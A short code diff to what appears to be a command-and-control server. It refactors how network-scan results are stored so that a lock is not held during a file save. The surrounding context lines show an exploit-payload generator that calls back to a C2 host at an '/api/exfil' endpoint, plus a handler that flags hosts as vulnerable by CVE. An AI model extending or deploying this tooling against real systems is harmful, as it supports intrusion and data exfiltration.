@@ -209,6 +209,18 @@ def scan_network(cidr=None):
     return results
 
 
+def record_scan_results(results):
+    """Append scan findings to history (capped at 100) and persist to disk.
+
+    The lock is always released before the file write: ``save_scans()``
+    acquires the non-reentrant ``scans_lock`` itself.
+    """
+    with scans_lock:
+        scans.extend(results)
+        scans[:] = scans[-100:]
+    save_scans()
+
+
 def generate_payload(target_ip, family, c2_ip):
     """Generate an exploit payload that connects back to the C2."""
     payload_url = f"http://{c2_ip}:{C2_PORT}/api/exfil"
@@ -894,11 +906,7 @@ class C2Handler(BaseHTTPRequestHandler):
                         r["cve_ids"] = [c["id"] for c in info["cves"]]
                         r["vulnerable"] = True
 
-            with scans_lock:
-                scans.extend(results)
-                # Keep only last 100 scans
-                scans[:] = scans[-100:]
-                save_scans()
+            record_scan_results(results)
 
             self.send_json(200, {"status": "ok", "found": len(results), "results": results})
         except Exception as e:
